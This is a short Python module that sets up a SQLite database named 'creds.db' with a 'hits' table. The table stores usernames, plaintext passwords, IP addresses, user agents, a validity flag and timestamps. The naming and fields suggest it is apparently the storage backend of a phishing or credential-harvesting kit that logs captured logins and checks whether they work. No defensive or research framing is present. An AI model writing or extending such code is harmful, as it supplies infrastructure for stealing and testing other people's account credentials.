import sqlite3
import os

# Берем путь к папке backend и создаем файл базы там
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'creds.db')

def init():
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.execute("""CREATE TABLE IF NOT EXISTS hits(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT, password TEXT, ip TEXT, ua TEXT,
        valid INTEGER DEFAULT 0, ts INTEGER)""")
    c.commit()
    return c